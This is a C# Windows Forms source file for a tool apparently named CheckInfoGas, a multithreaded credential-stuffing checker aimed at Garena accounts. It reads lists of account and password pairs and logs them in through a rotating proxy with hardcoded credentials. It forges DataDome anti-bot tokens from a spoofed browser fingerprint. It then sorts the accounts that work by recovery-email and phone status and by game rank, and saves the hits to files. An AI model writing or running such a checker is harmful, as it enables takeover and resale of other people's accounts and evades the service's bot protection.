using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;

namespace CheckInfoGas
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(FilePath))
            {
                int maxThread = (int)numThread.Value;
                Check(maxThread);
            }
            else
            {
                MessageBox.Show("Chưa chọn file account", "Thông báo!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private async void Check(int maxThread)
        {
            var tasks = new List<Task>();
            var semaphore = new SemaphoreSlim(maxThread, maxThread);
            var lines = await File.ReadAllLinesAsync(FilePath);
            foreach (var line in lines)
            {
                if (string.IsNullOrEmpty(line))
                    continue;

                var dataRaw = line.Split('|');
                if (dataRaw.Length < 2)
                    continue;

                var account = dataRaw[0];
                var password = dataRaw[1];
                int add = 0;
                dgv.Invoke(new Action(() =>
                {
                    add = dgv.Rows.Add((dgv.Rows.Count + 1), account, password);
                }));
                DataGridViewRow row = dgv.Rows[add];
                await semaphore.WaitAsync();
                tasks.Add(CheckPerThread(row, account, password, semaphore));
                await Task.Delay(100);
            }
            await Task.WhenAll(tasks);
            MessageBox.Show("Xong");
        }

        private async Task CheckPerThread(DataGridViewRow row, string account, string password, SemaphoreSlim semaphoreSlim)
        {
            await Task.Run(async () =>
            {
                bool isSuccess = false;
                while (!isSuccess)
                {
                    try
                    {
                        SetStatusDataGridView(row, "Running");
                        var http = new HttpRequest
                        {
                            Cookies = new CookieDictionary(),
                        };

                        var (v1, v2) = GetDataHashPassword(account);

                        if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2))
                        {
                            int i = 3;
                            while (i > 0 && string.IsNullOrEmpty(v1) && string.IsNullOrEmpty(v2))
                            {
                                (v1, v2) = GetDataHashPassword(account);
                                i--;
                            }
                        }

                        var headers = new Dictionary<string, string>
                        {
                            {"Accept", "application/json, text/plain, */*"},
                            {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
                            {"Cookie", "_ga=GA1.1.1629491323.1706450848; token_session=c17e119c61460aab0b4a2024157a11b244f5430627c9566b0a8f702adb5f573a3edc9cb577dc1f4dbbe5f948e18d8c6e; _ga_1M7M9L6VPX=GS1.1.1708017064.12.1.1708017065.0.0.0; datadome=" + GetDataDome()},
                            {"Sec-Fetch-Dest", "empty"},
                            {"Sec-Fetch-Mode", "cors"},
                            {"Sec-Fetch-Site", "same-origin"},
                            {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
                            {"sec-ch-ua-mobile", "?1"},
                            {"sec-ch-ua-platform", "\"Android\""},
                            {"x-datadome-clientid", GetDataDome()}
                        };
                        foreach (var header in headers)
                        {
                            http.AddHeader(header.Key, header.Value);
                        }

                        long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;

                        string encryptedPass = MaHoaPassGarena(
                            MD5Hash(password),
                            SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
                        );

                        SetStatusDataGridView(row, "Get session");
                        var httpResponse = http.Get($"https://sso.garena.com/api/login?account={account}&password={encryptedPass}&format=json&id={id}&app_id=10043");

                        var response = httpResponse.ToString();
                        if (response.Contains("error_user_ban"))
                        {
                            SetStatusDataGridView(row, "Ban Account");
                            await WriteToFileAsync("Ban.txt", $"{account}|{password}");
                        }
                        else if (response.Contains("error_auth"))
                        {
                            SetStatusDataGridView(row, "Wrong password");
                            await WriteToFileAsync("WrongPass.txt", $"{account}|{password}");
                        }
                        else if (!response.Contains("error_suspicious_ip"))
                        {
                            var dataObject = JObject.Parse(response);
                            if (dataObject.ContainsKey("session_key"))
                            {
                                var sessionKey = dataObject["session_key"].ToString();
                                SetStatusDataGridView(row, "Login Success");
                                var status = string.Empty;

                                if (cbInfo.Checked)
                                {
                                    var infoStatus = CheckInfoAccount(http);
                                    if (infoStatus == "User info does not exist or is null")
                                    {
                                        SetStatusDataGridView(row, "User info does not exist or is null");
                                    }
                                    else if (infoStatus == "Error_Pass")
                                    {
                                        status = infoStatus;
                                        if (!cbLQ.Checked)
                                        {
                                            await WriteToFileAsync("Error_Pass.txt", $"{account}|{password}|{infoStatus}");
                                        }
                                    }
                                    else if (infoStatus == "Error_Mail")
                                    {
                                        status = infoStatus;
                                        if (!cbLQ.Checked)
                                        {
                                            await WriteToFileAsync("Error_Mail.txt", $"{account}|{password}|{infoStatus}");
                                        }
                                    }
                                    else if (infoStatus == "TTT")
                                    {
                                        status = infoStatus;
                                        if (!cbLQ.Checked)
                                        {
                                            await WriteToFileAsync("TTT.txt", $"{account}|{password}|{infoStatus}");
                                        }
                                    }
                                    else if (infoStatus == "FullTT")
                                    {
                                        status = infoStatus;
                                        if (!cbLQ.Checked)
                                        {
                                            await WriteToFileAsync("FullTT.txt", $"{account}|{password}|{infoStatus}");
                                        }
                                    }
                                    else if (infoStatus == "Error_Phone")
                                    {
                                        status = infoStatus;
                                        if (!cbLQ.Checked)
                                        {
                                            await WriteToFileAsync("Error_Phone.txt", $"{account}|{password}|{infoStatus}");
                                        }
                                    }

                                    SetStatusDataGridView(row, status);
                                }

                                if (cbLQ.Checked)
                                {
                                    var fileName = status;
                                    var infoLQ = CheckLienQuan(sessionKey);
                                    if (!cbInfo.Checked)
                                    {
                                        if (string.IsNullOrEmpty(infoLQ))
                                        {
                                            fileName = "LienQuanFail";
                                            infoLQ = "No Data";
                                        }
                                        else
                                        {
                                            fileName = "LienQuanSuccess";
                                        }
                                    }
                                    status = string.IsNullOrEmpty(status) ? infoLQ : status + infoLQ;
                                    await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");

                                    SetStatusDataGridView(row, status);
                                }

                                if (!cbLQ.Checked && !cbInfo.Checked)
                                {
                                    await WriteToFileAsync("Success.txt", $"{account}|{password}");
                                }
                            }
                            else
                            {
                                SetStatusDataGridView(row, "Không có session key");
                            }
                        }
                        else
                        {
                            SetStatusDataGridView(row, "Spam ip");
                        }

                        isSuccess = true;
                    }
                    catch (Exception ex)
                    {
                        SetStatusDataGridView(row, ex.Message);
                    }
                }
                semaphoreSlim.Release();
            });
        }

        async Task WriteTextAsync(string filePath, string text)
        {
            text = text + Environment.NewLine;
            byte[] encodedText = Encoding.Unicode.GetBytes(text);

            using var sourceStream =
                new FileStream(
                    filePath,
                    FileMode.Create, FileAccess.Write, FileShare.None,
                    bufferSize: 4096, useAsync: true);

            await sourceStream.WriteAsync(encodedText, 0, encodedText.Length);
        }

        private void SetStatusDataGridView(DataGridViewRow row, string status)
        {
            dgv.Invoke(new Action(() =>
            {
                row.Cells["cStatus"].Value = status;
            }));
        }

        private async Task WriteToFileAsync(string fileName, string content)
        {
            bool isSuccess = false;
            while (!isSuccess)
            {
                try
                {
                    using (var sw = new StreamWriter(fileName, true))
                    {
                        await sw.WriteLineAsync(content);
                    }
                    isSuccess = true;
                }
                catch
                {
                    await Task.Delay(100);
                }
            }
        }

        private string CheckF04(HttpRequest http)
        {
            var test = http.Get("https://auth.garena.com/oauth/login?client_id=100072&redirect_uri=https%3A%2F%2Franking.fconline.garena.vn%2Flogin%2Fcallback&response_type=token&platform=1&locale=vi-VN").ToString();

            var payload = "client_id=32837&redirect_uri=https%3A%2F%2Franking.fo4.garena.vn%2Flogin%2Fcallback&response_type=token&platform=1&locale=vi-VN&format=json&id=1710952555792&app_id=32837";
            var test3 = http.Post("https://connect.garena.com/oauth/token/grant", payload, "application/x-www-form-urlencoded").ToString();

            var oauthObject = JObject.Parse(test3);
            var redirectUrl = oauthObject["redirect_uri"].ToString();
            var response = http.Get(redirectUrl).ToString();
            var cookie = http.Cookies.ToDictionary(x => x.Key, x => x.Value);
            var sessionId = cookie.Where(x => x.Key.Equals("sessionid")).FirstOrDefault().Value.ToString();
            var csrfToken = cookie.Where(x => x.Key.Equals("csrftoken")).FirstOrDefault().Value.ToString();

            var http2 = new HttpRequest()
            {
                Cookies = new CookieDictionary()
            };
            var cookieRanking = $"sessionid={sessionId}";
            var headers = new Dictionary<string, string>
            {
                {"Accept", "*/*"},
                {"Accept-Language", "en"},
                {"Cookie", cookieRanking},
                {"Sec-Fetch-Dest", "empty"},
                {"Sec-Fetch-Mode", "cors"},
                {"Sec-Fetch-Site", "same-origin"},
                {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
                {"sec-ch-ua-mobile", "?1"},
                {"sec-ch-ua-platform", "\"Android\""},
            };
            foreach (var header in headers)
            {
                http2.AddHeader(header.Key, header.Value);
            }
            //http2.AddHeader("Upgrade-Insecure-Requests", "1");
            http2.AddHeader("X-Csrftoken", csrfToken);
            //http2.AddHeader("Sec-Fetch-Mode", "cor");
            //http2.AddHeader("Sec-Fetch-Site", "same-origin");
            //http2.AddHeader("Sec-Fetch-Dest", "empty");
            //http2.AddHeader("sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"");
            //http2.AddHeader("sec-ch-ua-mobile", "?1");
            //http2.AddHeader("sec-ch-ua-platform", "\"Android\"");
            http2.Referer = "https://ranking.fconline.garena.vn/thong-tin";
            http2.UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Mobile Safari/537.36";
            //var test2 = http2.Get("https://ranking.fconline.garena.vn/api/user/profile").ToString();
            var test2 = http2.Get("https://ranking.fconline.garena.vn/api/user/get").ToString();
            foreach (var header in headers)
            {
                http2.AddHeader(header.Key, header.Value);
            }
            http2.AddHeader("X-Csrftoken", csrfToken);
            var test4 = http2.Get("https://ranking.fconline.garena.vn/0.f77df8ae93b45aa0d540.js").ToString();
            foreach (var header in headers)
            {
                http2.AddHeader(header.Key, header.Value);
            }
            http2.AddHeader("X-Csrftoken", csrfToken);
            var test7 = http2.Get("https://ranking.fconline.garena.vn/api/user/profile").ToString();
            return "";
        }

        private string CheckLienQuan(string sessionKey)
        {
            var http = new HttpRequest()
            {
                Cookies = new CookieDictionary(),
            };

            Dictionary<string, string> headers = new Dictionary<string, string>
            {
                { "Cookie", "session_key=" + sessionKey }
            };

            foreach (var header in headers)
            {
                http.AddHeader(header.Key, header.Value);
            }

            var response = http.Post("https://pvp.garena.vn/api/summoner/profile/", "{}", "application/json, text/plain, */*").ToString();
            var hero = string.Empty;
            var responseObject = JObject.Parse(response);
            if (responseObject.ContainsKey("summoner_info"))
            {

                if (response.Contains("champion_cnt"))
                {
                    hero = responseObject["summoner_info"]["champion_cnt"].ToString();
                    if (hero == "10")
                    {
                        hero = "KXD";
                    }
                }
                var levelGame = responseObject["summoner_info"]["pvp_level"].ToString();
                var nameIG = responseObject["summoner_info"]["name"].ToString();
                var rankGame = responseObject["summoner_info"]["ladder_grade"].ToString().Substring(0, 1) ?? string.Empty;
                var rankInfo = string.Empty;
                switch (rankGame)
                {
                    case "1":
                        rankInfo = "Brown";
                        break;
                    case "2":
                        rankInfo = "Silver";
                        break;
                    case "3":
                        rankInfo = "Gold";
                        break;
                    case "4":
                        rankInfo = "Platinum";
                        break;
                    case "5":
                        rankInfo = "Diamond";
                        break;
                    case "6":
                        rankInfo = "Master";
                        break;
                    case "8":
                        rankInfo = "TA";
                        break;
                    default:
                        rankInfo = "NO RANK";
                        break;
                }

                return $"{hero}|{levelGame}|{rankInfo}|{nameIG}";
            }

            return "";
        }

        private string CheckInfoAccount(HttpRequest http)
        {
            var urlCheckInfo = "https://account.garena.com/api/account/init";
            var responseInfo = http.Get(urlCheckInfo).ToString();
            var initObject = JObject.Parse(responseInfo);
            if (initObject.ContainsKey("user_info"))
            {
                var checkPhone = false;
                var checkEmail = false;
                var checkIdCard = false;
                var infoStatus = string.Empty;
                var suspicious = Convert.ToBoolean(initObject["user_info"]["suspicious"].ToString());
                var phoneNumber = initObject["user_info"]["mobile_no"].ToString();
                checkPhone = phoneNumber.Contains("*") ? true : false;

                var emailVerification = initObject["user_info"]["email_v"].ToString();
                checkEmail = emailVerification.Equals("0") ? false : true;

                var fbAccount = initObject["user_info"]["fb_account"].ToString();
                if (!string.IsNullOrEmpty(fbAccount))
                {
                    var fbUid = initObject["user_info"]["fb_account"]["fb_uid"].ToString();
                    var fbStatus = CheckLiveFb(fbUid);
                }

                checkIdCard = initObject.ContainsKey("idcard") ? true : false;
                if (checkPhone == false && checkEmail == false)
                {
                    if (suspicious)
                    {
                        infoStatus = "Error_Pass";
                    }
                    else
                    {
                        infoStatus = "TTT";
                    }
                }
                else if (checkEmail == true && checkPhone == false)
                {
                    infoStatus = "Error_Mail";
                }
                else if (checkPhone == true && checkEmail == true)
                {
                    infoStatus = "FullTT";
                }
                else if (checkEmail == false && checkPhone == true)
                {
                    infoStatus = "Error_Phone";
                }
                return infoStatus;
            }
            else
            {
                return "User info does not exist or is null";
            }
        }

        private string MaHoaPassGarena(string plaintext, string key)
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;

                aes.Key = StringToByteArray(key.Substring(0, 64));

                var encryptor = aes.CreateEncryptor(aes.Key, null);

                byte[] plainTextBytes = HexStringToByteArray(plaintext);
                byte[] cipherTextBytes = encryptor.TransformFinalBlock(plainTextBytes, 0, plainTextBytes.Length);

                return ByteArrayToString(cipherTextBytes).Substring(0, 32);
            }
        }

        private string MD5Hash(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                return ByteArrayToString(hashBytes);
            }
        }

        private string SHA256Hash(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = sha256.ComputeHash(inputBytes);

                return ByteArrayToString(hashBytes);
            }
        }

        private string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        private byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        // Thêm hàm này để chuyển đổi chuỗi Hex thành mảng byte
        private byte[] HexStringToByteArray(string hex)
        {
            int NumberChars = hex.Length / 2;
            byte[] bytes = new byte[NumberChars];
            using (var sr = new System.IO.StringReader(hex))
            {
                for (int i = 0; i < NumberChars; i++)
                    bytes[i] = Convert.ToByte(new string(new char[2] { (char)sr.Read(), (char)sr.Read() }), 16);
            }
            return bytes;
        }

        private bool CheckLiveFb(string uid)
        {
            try
            {
                var http = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                };
                var response = http.Get($"https://graph.facebook.com/{uid}/picture?type=normal&redirect=false").ToString();
                if (response.Contains("height") || response.Contains("width"))
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        private (string, string) GetDataHashPassword(string account)
        {
            try
            {
                var http = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    Proxy = HttpProxyClient.Parse("as.lunaproxy.com:12233"),
                };
                http.Proxy.Username = "user-honganhne-region-sg";
                http.Proxy.Password = "honganhne";
                long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;
                var dataDome = GetDataDome();
                var headers = new Dictionary<string, string>
                {
                    {"Accept", "application/json, text/plain, */*"},
                    //{"Accept-Encoding", "gzip, deflate, br"},
                    {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
                    //{"Connection", "keep-alive"},
                    {"Cookie", "_ga=GA1.1.1629491323.1706450848; token_session=c17e119c61460aab0b4a2024157a11b244f5430627c9566b0a8f702adb5f573a3edc9cb577dc1f4dbbe5f948e18d8c6e; _ga_1M7M9L6VPX=GS1.1.1708017064.12.1.1708017065.0.0.0; datadome=" + dataDome},
                    //{"Host", "sso.garena.com"},
                    {"Referer", "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"},
                    {"Sec-Fetch-Dest", "empty"},
                    {"Sec-Fetch-Mode", "cors"},
                    {"Sec-Fetch-Site", "same-origin"},
                    {"User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"},
                    {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
                    {"sec-ch-ua-mobile", "?1"},
                    {"sec-ch-ua-platform", "\"Android\""},
                    {"x-datadome-clientid", dataDome}
                };
                http.KeepAlive = true;
                http.EnableEncodingContent = true;
                http.UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36";
                http.Referer = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN";
                foreach (var header in headers)
                {
                    if (header.Key.Equals("Cookie"))
                    {
                        var cookieJar = header.Value.Split(';');
                        foreach (var cookie in cookieJar)
                        {
                            var cookieTemp = cookie.Split('=');
                            try
                            {
                                http.Cookies.Add(cookieTemp[0], cookieTemp[1]);
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        http.AddHeader(header.Key, header.Value);
                    }
                }

                var response = http.Get($"https://sso.garena.com/api/prelogin?account={account}&format=json&id={id}&app_id=10043").ToString();
                if (response.Contains("error_no_account"))
                    return ("", "");
                var v1 = JObject.Parse(response)["v1"].ToString();
                var v2 = JObject.Parse(response)["v2"].ToString();

                return (v1, v2);
            }
            catch
            {
                return ("", "");
            }
        }

        private string GetDataDome()
        {
            HttpRequest http = new HttpRequest
            {
                Cookies = new CookieDictionary(),
            };

            var dataPost = "jsData={\"ttst\":34.500000178813934,\"ifov\":false,\"wdifrm\":false,\"wdif\":false,\"br_h\":844,\"br_w\":390,\"br_oh\":844,\"br_ow\":390,\"nddc\":1,\"rs_h\":844,\"rs_w\":390,\"rs_cd\":24,\"phe\":false,\"nm\":false,\"jsf\":false,\"ua\":\"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1\",\"lg\":\"vi\",\"pr\":3,\"hc\":4,\"ars_h\":844,\"ars_w\":390,\"tz\":-420,\"str_ss\":true,\"str_ls\":true,\"str_idb\":true,\"str_odb\":true,\"plgod\":false,\"plg\":0,\"plgne\":\"NA\",\"plgre\":\"NA\",\"plgof\":\"NA\",\"plggt\":\"NA\",\"pltod\":false,\"hcovdr\":false,\"hcovdr2\":false,\"plovdr\":false,\"plovdr2\":false,\"ftsovdr\":false,\"ftsovdr2\":false,\"lb\":true,\"eva\":33,\"lo\":true,\"ts_mtp\":1,\"ts_tec\":true,\"ts_tsa\":true,\"vnd\":\"Google Inc.\",\"bid\":\"NA\",\"mmt\":\"empty\",\"plu\":\"empty\",\"hdn\":false,\"awe\":false,\"geb\":false,\"dat\":false,\"med\":\"defined\",\"aco\":\"probably\",\"acots\":false,\"acmp\":\"probably\",\"acmpts\":true,\"acw\":\"probably\",\"acwts\":false,\"acma\":\"maybe\",\"acmats\":false,\"acaa\":\"probably\",\"acaats\":true,\"ac3\":\"\",\"ac3ts\":false,\"acf\":\"probably\",\"acfts\":false,\"acmp4\":\"maybe\",\"acmp4ts\":false,\"acmp3\":\"probably\",\"acmp3ts\":false,\"acwm\":\"maybe\",\"acwmts\":false,\"ocpt\":false,\"vco\":\"probably\",\"vcots\":false,\"vch\":\"probably\",\"vchts\":true,\"vcw\":\"probably\",\"vcwts\":true,\"vc3\":\"maybe\",\"vc3ts\":false,\"vcmp\":\"\",\"vcmpts\":false,\"vcq\":\"\",\"vcqts\":false,\"vc1\":\"probably\",\"vc1ts\":true,\"dvm\":4,\"sqt\":false,\"so\":\"portrait-primary\",\"wbd\":false,\"wbdm\":true,\"wdw\":true,\"cokys\":\"bG9hZFRpbWVzY3NpYXBwcnVudGltZQ==L=\",\"ecpc\":false,\"lgs\":true,\"lgsod\":false,\"psn\":true,\"edp\":true,\"addt\":true,\"wsdc\":true,\"ccsr\":true,\"nuad\":true,\"bcda\":false,\"idn\":true,\"capi\":false,\"svde\":false,\"vpbq\":true,\"ucdv\":false,\"spwn\":false,\"emt\":false,\"bfr\":false,\"dbov\":false,\"npmtm\":false,\"jset\":1657013360}&events=[]&eventCounters=[]&jsType=ch&cid=.9Nfoi4MbtrhZ~-OzCe~9usp06_xKvitrfSO_5i8SbAvj_9hA-MnNwlaDhl4GxNX4oYEwpAo-KAriC6KcwwSwKfxI.I8_5UJuMtUXNzFVIbpOuMkCbT97yipJWa-gR3r&ddk=AE3F04AD3F0D3A462481A337485081&Referer=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN&request=%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN&responsePage=origin&ddv=4.4.3";
            var response = http.Post("https://api-js.datadome.co/js/", dataPost, "application/x-www-form-urlencoded").ToString();
            var cookie = JObject.Parse(response)["cookie"].ToString();
            return Regex.Match(cookie, "datadome=(.*?);").Groups[1].Value;
        }

        private string FilePath;

        private void importToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FilePath = openFileDialog.FileName;
            }
            else
            {
                FilePath = string.Empty;
            }
        }
    }
}
